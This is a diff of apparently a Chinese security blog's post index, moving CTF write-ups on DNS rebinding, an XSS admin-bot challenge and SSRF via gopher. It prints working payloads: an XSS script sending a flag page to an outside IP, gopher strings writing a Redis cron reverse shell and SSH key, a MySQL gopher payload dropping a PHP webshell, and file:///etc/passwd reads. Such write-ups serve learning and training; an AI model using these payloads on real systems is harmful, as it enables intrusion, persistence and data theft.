+&lt;!-- src of this PHP script: /index.php?action=source --&gt;//                    &lt;!-- the flag is in /flag.php, which permits access only from internal network :-) --&gt;                    &lt;!-- this service is running on php-fpm and nginx. see /docker-compose.yml --&gt;
 
-解析：
-fetch(&quot;/&quot;)                                   // ① admin 身份拿 dashboard  .then(r =&gt; r.text())                       // ② 读 HTML 文本  .then(h =&gt; &#123;                               // ③ 从 HTML 里抠出 flag 的 sid    let s = h.split(&quot;/s/&quot;)[1].substring(0,40);    fetch(&quot;/s/&quot; + s).then(r =&gt; r.text())     // ④ 读 flag 页面      .then(t =&gt; &#123;        new Image().src = &quot;http://120.53.249.234:8080/?d=&quot; + encodeURIComponent(t);  // ⑤ 外带      &#125;);  &#125;); 
+根据源码提示,访问http://ocu.chal.seccon.jp:10000/index.php?action=source读取源码,我们重点看PHP代码部分
+&lt;?phpif (isset($_GET[&#x27;url&#x27;]))&#123;    $url = filter_input(INPUT_GET, &#x27;url&#x27;);    $parsed_url = parse_url($url);                            if($parsed_url[&quot;scheme&quot;] !== &quot;http&quot;)&#123;        // only http: should be allowed.         echo &#x27;URL should start with http!&#x27;;    &#125; else if (gethostbyname(idn_to_ascii($parsed_url[&quot;host&quot;], 0, INTL_IDNA_VARIANT_UTS46)) === gethostbyname(&quot;nginx&quot;)) &#123;    // local access to nginx from php-fpm should be blocked.        echo &#x27;Oops, are you a robot or an attacker?&#x27;;    &#125; else &#123;    // file_get_contents needs idn_to_ascii(): https://stackoverflow.com/questions/40663425/        highlight_string(file_get_contents(idn_to_ascii($url, 0, INTL_IDNA_VARIANT_UTS46),               false,               stream_context_create(array(                   &#x27;http&#x27; =&gt; array(                       &#x27;follow_location&#x27; =&gt; false,                       &#x27;timeout&#x27; =&gt; 2                   )    ))));    &#125;&#125;?&gt;
 
-服务器监听：python3 -m http.server 8080
+我们提交http://ocu.chal.seccon.jp:10000/flag.php,返回Forbidden.Your IP: 172.25.0.1,看来我们的ip被定为172.25.0.1,根据代码,我们得先知道nginx的ip,简单fuzz后,提交http://172.25.0.3/flag.php会触发Oops, are you a robot or an attacker?,确认了nginx的ip后,跟上题一样,我们在上一题给出的网站构造域名,一个填172.25.0.3,另一个IP就随意了,原理也跟上题类似,当然也是随机的,多点几次就访问到flag了.
+当然本题还有其他一些有趣的解法,比如以下的一些payload都是可以的
+http://nginx：80/flag.phphttp://＠nginx/flag.phphttp://nginx／flag.php
 
+[0xGame_2025_web]DNS想要玩：//源码from flask import Flask, requestfrom urllib.parse import urlparseimport socketimport osapp = Flask(__name__)BlackList=[    &#x27;localhost&#x27;, &#x27;@&#x27;, &#x27;172&#x27;, &#x27;gopher&#x27;, &#x27;file&#x27;, &#x27;dict&#x27;, &#x27;tcp&#x27;, &#x27;0.0.0.0&#x27;, &#x27;114.5.1.4&#x27;]def check(url):    url = urlparse(url)    host = url.hostname    host_acscii = host.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)    return socket.gethostbyname(host_acscii) == &#x27;114.5.1.4&#x27;@app.route(&#x27;/&#x27;)def index():    return open(__file__).read()@app.route(&#x27;/ssrf&#x27;)def ssrf():    raw_url = request.args.get(&#x27;url&#x27;)    if not raw_url:        return &#x27;URL Needed&#x27;    for u in BlackList:        if u in raw_url:            return &#x27;Invaild URL&#x27;    if check(raw_url):        return os.popen(request.args.get(&#x27;cmd&#x27;)).read()    else:        return &quot;NONONO&quot;if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;,port=8000)
 
-url解码
+过滤了114.5.1.4，但是需要满⾜hostname是114.5.1.4，可以使⽤DNS重绑定向https://zhuanlan.zhihu.com/p/89426041
+这⾥我们⽤这个⽹站：https://lock.cmpxchg8b.com/rebinder.html
 
+/ssrf?url=http://72050104.c0a80002.rbndr.us&amp;cmd=ls /
 
-带出整个页面，得到flag
+/ssrf?url=http://72050104.c0a80002.rbndr.us&amp;cmd=cat /flag
+
+0xGame{DNS_Rebinding_is_Really_Magical}
 ]]></content>
       <categories>
-        <category>CTF wp</category>
+        <category>Web安全</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
-        <tag>XSS</tag>
-        <tag>Admin Bot</tag>
+        <tag>DNS重定向</tag>
       </tags>
   </entry>
   <entry>
@@ -2385,63 +2445,86 @@ Payload Encode 取消勾选的 URL-encode, 否则 base64 之后的 &#x3D; 会被
       </tags>
   </entry>
   <entry>
-    <title>DNS 重定向</title>
-    <url>/2026/08/24/dns-rebinding/</url>
-    <content><![CDATA[文章：https://zhuanlan.zhihu.com/p/89426041
-工具：https://lock.cmpxchg8b.com/rebinder.html
-DNS原理：https://www.ruanyifeng.com/blog/2016/06/dns.html1.DNSDNS是Domain Name Service的缩写,计算机域名服务器,在Internet上域名与IP地址之间是一一对应的，域名虽然便于人们记忆，但机器之间只能互相认识IP地址，它们之间的转换工作称为域名解析，而域名解析需要由专门的域名解析服务器来完成，这就是DNS域名服务器。就是根据域名查出IP地址。你可以把它想象成一本巨大的电话本。举例来说，如果你要访问域名math.stackexchange.com，首先要通过DNS查出它的IP地址是151.101.129.69。
-2.DNS TTLTTL值全称是“生存时间（Time To Live)”，简单的说它表示DNS记录在DNS服务器上缓存时间，数值越小，修改记录各地生效时间越快。
-当各地的DNS(LDNS)服务器接受到解析请求时，就会向域名指定的授权DNS服务器发出解析请求从而获得解析记录；该解析记录会在DNS(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向授权DNS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。
-常见的设置TTL值的场景1.增大TTL值，以节约域名解析时间通常情况下域名解析记录是很少更改的。我们可以通过增大域名记录的TTL值让记录在各地DNS服务器中缓存的时间加长，这样在更长的时间段内，我们访问这个网站时，本地ISP的DNS服务器就不需要向域名的NS服务器发出解析请求，而直接从本地缓存中返回域名解析记录,从而提高解析效率。 TTL值是以秒为单位的，通常的默认值都是3600，也就是默认缓存1小时。我们可以根据实际需要把TTL值扩大，例如要缓存一天就设置成86400。
-2.减小TTL值，减少更新域名记录时的不可访问时间更换空间因为TTL缓存的问题，新的域名记录，在有的地方可能生效了，有的地方可能等上一两天甚至更久才生效。结果就是有的人访问到了新服务器，有的人访问到了旧服务器。如果原来的域名TTL值设置的小，各地的ISP域名缓存服务器服务器就会很快的访问你域名的权威DNS解析服务器，尽快把你域名的DNS解析IP返回给查询者。
-3.DNS Rebinding在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。
-具体步骤
-攻击者控制恶意的DNS服务器来回复域的查询,如rebind.network
-攻击者通过一些方式诱导受害者加载http://rebind.network
-用户打开链接,浏览器就会发出DNS请求查找rebind.network的IP地址
-恶意DNS服务器收到受害者的请求,并使用真实IP地址进行响应,并将TTL值设置为1秒,让受害者的机器缓存很快失效
-从http://rebind.network加载的网页包含恶意的js代码,构造恶意的请求到http://rebind.network/index,而受害者的浏览器便在执行恶意请求
-一开始的恶意请求当然是发到了攻击者的服务器上,但是随着TTL时间结束,攻击者就可以让http://rebind.network绑定到别的IP,如果能捕获受害者的一些放在内网的应用IP地址,就可以针对这个内网应用构造出对应的恶意请求,然后浏览器执行的恶意请求就发送到了内网应用,达到了攻击的效果
+    <title>gopher 协议</title>
+    <url>/2026/08/24/gopher-protocol/</url>
+    <content><![CDATA[gopher协议的利用 - FreeBuf网络安全行业门户
+SSRF利用协议中的万金油——Gopher_dict协议-CSDN博客
+什么是gopher协议gopher协议可以理解为是http协议的前身，他可以实现多个数据包整合发送。通过gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。
+很多时候在SSRF下，我们无法通过HTTP协议来传递POST数据，这时候就需要用到gopher协议来发起POST请求了。
+gopher的协议格式如下：
+gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;    &lt;port&gt;默认为70发起多条请求每条要用回车换行去隔开使用%0d%0a隔开，如果多个参数，参数之间的&amp;也需要进行URL编码
 
-同源策略的失效对于WEB的同源策略相信大家都很熟悉,如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源,而不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。
-当然,页面中的链接，重定向以及表单提交是不会受到同源策略限制的,并且,跨域资源的引入是可以的。但是js不能读写加载的内容。
-同源策略确实提高了web的安全性,但是对于DNS Rebinding来说是没有作用的,因为同源策略看的是域名,并不是背后的IP地址,虽然两次的请求IP地址不同,但是由于DNS服务器的绑定,域名都是一样的,那么自然不违反同源策略.
-CTF实战应用balsnCTF2019 韩国鱼本题的一个步骤也涉及到了DNS重绑定的利用,这里就截取部分代码说明,完整的wp可以查看https://mp.weixin.qq.com/s/ToORsrR_1fh1gnnO2cM_VQ
-部分涉及到的代码
-$dst = @$_GET[&#x27;KR&#x27;];$res = @parse_url($dst);$ip = @dns_get_record($res[&#x27;host&#x27;], DNS_A)[0][&#x27;ip&#x27;];...$dev_ip = &quot;54.87.54.87&quot;;if($ip === $dev_ip) &#123;    $content = file_get_contents($dst);    echo $content;&#125;
+gopher发送请求curl发送端：ubuntu           监听段：vps
 
-很明显,题目是想定死我们域名的ip为54.87.54.87,但是这样就没法读到内网的信息了,如果我们域名解析的IP直接为127.0.0.1,那就无法过$ip === $dev_ip,接下来就得利用DNS Rebinding
-这是一个测试dns重绑定漏洞的网站,可以让一个域名随机的绑定两个IP https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg
-让我们在本地测试一下吧
-➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 127.0.0.1➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 127.0.0.1➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 54.87.54.87➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 54.87.54.87➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 54.87.54.87➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 54.87.54.87➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 127.0.0.1➜  ~ host 7f000001.36573657.rbndr.us7f000001.36573657.rbndr.us has address 127.0.0.1
 
-所以思路很明确,先让$ip为54.87.54.87,然后在file_get_contents的时候我们GET的域名又绑定到127.0.0.1,这样就绕过了if判断语句,可以读内网信息,当然,由于是随机的,所以要多打几次.
-[SECCON 2019 Web: Option-Cmd-U]题目地址:http://ocu.chal.seccon.jp:10000
-&lt;!-- src of this PHP script: /index.php?action=source --&gt;//                    &lt;!-- the flag is in /flag.php, which permits access only from internal network :-) --&gt;                    &lt;!-- this service is running on php-fpm and nginx. see /docker-compose.yml --&gt;
+gopher协议传递HTTP的GET请求http访问并抓包
+可以直接在Burpsuite 中将数据进行编码，编码的时候在最后一定要补%0d%0a代表结束
 
-根据源码提示,访问http://ocu.chal.seccon.jp:10000/index.php?action=source读取源码,我们重点看PHP代码部分
-&lt;?phpif (isset($_GET[&#x27;url&#x27;]))&#123;    $url = filter_input(INPUT_GET, &#x27;url&#x27;);    $parsed_url = parse_url($url);                            if($parsed_url[&quot;scheme&quot;] !== &quot;http&quot;)&#123;        // only http: should be allowed.         echo &#x27;URL should start with http!&#x27;;    &#125; else if (gethostbyname(idn_to_ascii($parsed_url[&quot;host&quot;], 0, INTL_IDNA_VARIANT_UTS46)) === gethostbyname(&quot;nginx&quot;)) &#123;    // local access to nginx from php-fpm should be blocked.        echo &#x27;Oops, are you a robot or an attacker?&#x27;;    &#125; else &#123;    // file_get_contents needs idn_to_ascii(): https://stackoverflow.com/questions/40663425/        highlight_string(file_get_contents(idn_to_ascii($url, 0, INTL_IDNA_VARIANT_UTS46),               false,               stream_context_create(array(                   &#x27;http&#x27; =&gt; array(                       &#x27;follow_location&#x27; =&gt; false,                       &#x27;timeout&#x27; =&gt; 2                   )    ))));    &#125;&#125;?&gt;
+转换为gopher
+curl gopher://10.211.55.2:80/_%47%45%54%20%2f%74%65%73%74%67%2e%70%68%70%3f%6e%61%6d%65%3d%78%78%78%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%32%31%31%2e%35%35%2e%32%0d%0a
 
-我们提交http://ocu.chal.seccon.jp:10000/flag.php,返回Forbidden.Your IP: 172.25.0.1,看来我们的ip被定为172.25.0.1,根据代码,我们得先知道nginx的ip,简单fuzz后,提交http://172.25.0.3/flag.php会触发Oops, are you a robot or an attacker?,确认了nginx的ip后,跟上题一样,我们在上一题给出的网站构造域名,一个填172.25.0.3,另一个IP就随意了,原理也跟上题类似,当然也是随机的,多点几次就访问到flag了.
-当然本题还有其他一些有趣的解法,比如以下的一些payload都是可以的
-http://nginx：80/flag.phphttp://＠nginx/flag.phphttp://nginx／flag.php
+gopher协议传递HTTP的POST请求用gopher协议传递POST请求时，必须要包含这四个，还有一个post传参
 
-[0xGame_2025_web]DNS想要玩：//源码from flask import Flask, requestfrom urllib.parse import urlparseimport socketimport osapp = Flask(__name__)BlackList=[    &#x27;localhost&#x27;, &#x27;@&#x27;, &#x27;172&#x27;, &#x27;gopher&#x27;, &#x27;file&#x27;, &#x27;dict&#x27;, &#x27;tcp&#x27;, &#x27;0.0.0.0&#x27;, &#x27;114.5.1.4&#x27;]def check(url):    url = urlparse(url)    host = url.hostname    host_acscii = host.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)    return socket.gethostbyname(host_acscii) == &#x27;114.5.1.4&#x27;@app.route(&#x27;/&#x27;)def index():    return open(__file__).read()@app.route(&#x27;/ssrf&#x27;)def ssrf():    raw_url = request.args.get(&#x27;url&#x27;)    if not raw_url:        return &#x27;URL Needed&#x27;    for u in BlackList:        if u in raw_url:            return &#x27;Invaild URL&#x27;    if check(raw_url):        return os.popen(request.args.get(&#x27;cmd&#x27;)).read()    else:        return &quot;NONONO&quot;if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;,port=8000)
+gopher协议的SSRF攻击gopher协议在ssrf的利用中一般用来攻击redis，mysql，fastcgi，smtp等服务。
+gopher协议数据格式：
+gopher://ip:port/_TCP/IP数据流
 
-过滤了114.5.1.4，但是需要满⾜hostname是114.5.1.4，可以使⽤DNS重绑定向https://zhuanlan.zhihu.com/p/89426041
-这⾥我们⽤这个⽹站：https://lock.cmpxchg8b.com/rebinder.html
+注意：
 
-/ssrf?url=http://72050104.c0a80002.rbndr.us&amp;cmd=ls /
+gopher协议数据流中，url编码使用%0d%0a替换字符串中的回车换行
+数据流末尾使用%0d%0a代表消息结束
 
-/ssrf?url=http://72050104.c0a80002.rbndr.us&amp;cmd=cat /flag
+gopher打redis1.探测SSRF以及Redis服务使用file协议读取文件内容
+file:///etc/passwdfile:///var/www/html/index.phpfile:///usr/local/apache-tomcat/conf/server.xml
 
-0xGame{DNS_Rebinding_is_Really_Magical}
+使用dict协议探测开放的端口，可以看到开放了80，443，6379服务(bp端口扫描)
+dict://127.0.0.1:6379/info
+
+判断redis服务有无身份验证，发现redis存在未授权访问
+dict://127.0.0.1:6379/info
+
+2.使用gopher协议写入定时任务redis未授权常规写入定时任务的操作
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0attt%0d%0a$69%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xx/1444 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
+
+ 注意：curl_exec()造成的SSRF，gopher协议需要使用二次URLEncode;而file_get_contents()造成的SSRF，gopher协议就不用进行二次URLEncode
+3.使用gopher协议写入ssh公钥常规redis未授权写入ssh公钥操作：
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$576%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHSdAmmBYRnUrfOOO0N0Y/fKCLHEqt8aoc3pQPfAKStDL12rlPlf0nmkzQmPcHoHBKW6AEqb2QXWiB2TQFJTBdMXThHdZe4RzN5pLPPlqUg6dZZQhIT0/La+POIyRRVRld+8vwDw1bNpWcnlNPxf77LS9yJxQZzub6o7OWL/w2xWLexSQAYUQ9mflz4qluV+/M4iVRuZ3FNzqDWgeIziDCUaJydBpO1cisMj9TWkXCmGaj5hl1WsrffaIjsdHO6wbrZIERGh/3HDpwXlsVXc2+m9Nyxalh4qeGFVG/Fso7APhVcAfhA3lkNOTwySk+sss6JE2ic3slvIO2zXj1wI/IHMPXNb2nhnVW+WRSDp9OAcDxdLTJK0k2pVlq2yi/dWUjrcZBP3LV9pnb5ASrKmhBzxkqSPnrBhyp55qawKW2rnCeHSg9gMt/OBlMKrGnroZj+w9scuie5OxDy/7Vvr7l8vq2IbzBoWEd5d4dxCDpmtXZS/yEnIo5Y9IIQJNuOvs= root@mk50%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
+
+4.Gopherus工具构造gopher协议数据流攻击Redis利用：
+写入计划任务，反弹shell
+Gopherus工具利用
+例题：CTFshow359_打无密码的mysql
+关于MySQL无密码:MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP&#x2F;IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。
+
+
+gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%44%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%47%45%54%5b%63%5d%29%3b%3f%3e%27%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%63%2e%70%68%70%27%3b%01%00%00%00%01
+
+这串payload粘贴到returl参数下面，生成的 POC 里，_ 字符后面的内容还要 进行url编码。因为 PHP接收到POST或GET请求数据，自解码一次
+
+
+ls &#x2F;
+
+cat &#x2F;flag.txt
+
+ctfshow{726ffae1-ea22-47d1-81e6-6de837b9acfa}
+wireshark抓取3306原始数据包wireshark抓取3306原始数据包
+Gopher攻击mysql及内网SSRF利用 Gopher |Gopher攻击mysql及内网_ssrf打mysql-CSDN博客
+gopher的构造脚本：
+import urllib.parse host = &quot;127.0.0.1:80&quot;content = &quot;uname=admin&amp;passwd=admin&quot;content_length = len(content) payload =\&quot;&quot;&quot;POST /index.php HTTP/1.1Host: &#123;&#125;User-Agent: curl/7.43.0Accept: */*Content-Type: application/x-www-form-urlencodedContent-Length: &#123;&#125;&#123;&#125;&quot;&quot;&quot;.format(host,content_length,content) tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;) #CRLF(换行)漏洞result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+newresult = urllib.parse.quote(result)# 对新增的部分继续编码print(result)
+
+
+
+
+
+
+
 ]]></content>
       <categories>
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>DNS重定向</tag>
+        <tag>SSRF</tag>
+        <tag>gopher</tag>
       </tags>
   </entry>
   <entry>
@@ -3570,89 +3653,6 @@ flag23:DANTE{Bad_pr4ct1ces_Thru_strncmp}
       </tags>
   </entry>
   <entry>
-    <title>gopher 协议</title>
-    <url>/2026/08/24/gopher-protocol/</url>
-    <content><![CDATA[gopher协议的利用 - FreeBuf网络安全行业门户
-SSRF利用协议中的万金油——Gopher_dict协议-CSDN博客
-什么是gopher协议gopher协议可以理解为是http协议的前身，他可以实现多个数据包整合发送。通过gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。
-很多时候在SSRF下，我们无法通过HTTP协议来传递POST数据，这时候就需要用到gopher协议来发起POST请求了。
-gopher的协议格式如下：
-gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;    &lt;port&gt;默认为70发起多条请求每条要用回车换行去隔开使用%0d%0a隔开，如果多个参数，参数之间的&amp;也需要进行URL编码
-
-gopher发送请求curl发送端：ubuntu           监听段：vps
-
-
-gopher协议传递HTTP的GET请求http访问并抓包
-可以直接在Burpsuite 中将数据进行编码，编码的时候在最后一定要补%0d%0a代表结束
-
-转换为gopher
-curl gopher://10.211.55.2:80/_%47%45%54%20%2f%74%65%73%74%67%2e%70%68%70%3f%6e%61%6d%65%3d%78%78%78%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%32%31%31%2e%35%35%2e%32%0d%0a
-
-gopher协议传递HTTP的POST请求用gopher协议传递POST请求时，必须要包含这四个，还有一个post传参
-
-gopher协议的SSRF攻击gopher协议在ssrf的利用中一般用来攻击redis，mysql，fastcgi，smtp等服务。
-gopher协议数据格式：
-gopher://ip:port/_TCP/IP数据流
-
-注意：
-
-gopher协议数据流中，url编码使用%0d%0a替换字符串中的回车换行
-数据流末尾使用%0d%0a代表消息结束
-
-gopher打redis1.探测SSRF以及Redis服务使用file协议读取文件内容
-file:///etc/passwdfile:///var/www/html/index.phpfile:///usr/local/apache-tomcat/conf/server.xml
-
-使用dict协议探测开放的端口，可以看到开放了80，443，6379服务(bp端口扫描)
-dict://127.0.0.1:6379/info
-
-判断redis服务有无身份验证，发现redis存在未授权访问
-dict://127.0.0.1:6379/info
-
-2.使用gopher协议写入定时任务redis未授权常规写入定时任务的操作
-gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0attt%0d%0a$69%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xx/1444 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
-
- 注意：curl_exec()造成的SSRF，gopher协议需要使用二次URLEncode;而file_get_contents()造成的SSRF，gopher协议就不用进行二次URLEncode
-3.使用gopher协议写入ssh公钥常规redis未授权写入ssh公钥操作：
-gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$576%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHSdAmmBYRnUrfOOO0N0Y/fKCLHEqt8aoc3pQPfAKStDL12rlPlf0nmkzQmPcHoHBKW6AEqb2QXWiB2TQFJTBdMXThHdZe4RzN5pLPPlqUg6dZZQhIT0/La+POIyRRVRld+8vwDw1bNpWcnlNPxf77LS9yJxQZzub6o7OWL/w2xWLexSQAYUQ9mflz4qluV+/M4iVRuZ3FNzqDWgeIziDCUaJydBpO1cisMj9TWkXCmGaj5hl1WsrffaIjsdHO6wbrZIERGh/3HDpwXlsVXc2+m9Nyxalh4qeGFVG/Fso7APhVcAfhA3lkNOTwySk+sss6JE2ic3slvIO2zXj1wI/IHMPXNb2nhnVW+WRSDp9OAcDxdLTJK0k2pVlq2yi/dWUjrcZBP3LV9pnb5ASrKmhBzxkqSPnrBhyp55qawKW2rnCeHSg9gMt/OBlMKrGnroZj+w9scuie5OxDy/7Vvr7l8vq2IbzBoWEd5d4dxCDpmtXZS/yEnIo5Y9IIQJNuOvs= root@mk50%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
-
-4.Gopherus工具构造gopher协议数据流攻击Redis利用：
-写入计划任务，反弹shell
-Gopherus工具利用
-例题：CTFshow359_打无密码的mysql
-关于MySQL无密码:MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP&#x2F;IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。
-
-
-gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%44%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%47%45%54%5b%63%5d%29%3b%3f%3e%27%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%63%2e%70%68%70%27%3b%01%00%00%00%01
-
-这串payload粘贴到returl参数下面，生成的 POC 里，_ 字符后面的内容还要 进行url编码。因为 PHP接收到POST或GET请求数据，自解码一次
-
-
-ls &#x2F;
-
-cat &#x2F;flag.txt
-
-ctfshow{726ffae1-ea22-47d1-81e6-6de837b9acfa}
-wireshark抓取3306原始数据包wireshark抓取3306原始数据包
-Gopher攻击mysql及内网SSRF利用 Gopher |Gopher攻击mysql及内网_ssrf打mysql-CSDN博客
-gopher的构造脚本：
-import urllib.parse host = &quot;127.0.0.1:80&quot;content = &quot;uname=admin&amp;passwd=admin&quot;content_length = len(content) payload =\&quot;&quot;&quot;POST /index.php HTTP/1.1Host: &#123;&#125;User-Agent: curl/7.43.0Accept: */*Content-Type: application/x-www-form-urlencodedContent-Length: &#123;&#125;&#123;&#125;&quot;&quot;&quot;.format(host,content_length,content) tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;) #CRLF(换行)漏洞result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+newresult = urllib.parse.quote(result)# 对新增的部分继续编码print(result)
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>SSRF</tag>
-        <tag>gopher</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB DevArea 靶场 Writeup</title>
     <url>/2026/08/24/htb-devarea/</url>
     <content><![CDATA[DevAreanmapnmap -sS -sV 10.129.116.255
@@ -4626,6 +4626,263 @@ Arcane 1.13.0
       </tags>
   </entry>
   <entry>
+    <title>HTB NanoCorp 靶场 Writeup</title>
+    <url>/2026/08/24/htb-nanocorp/</url>
+    <content><![CDATA[nmapnmap -Pn -sT 10.129.243.199 -A
+
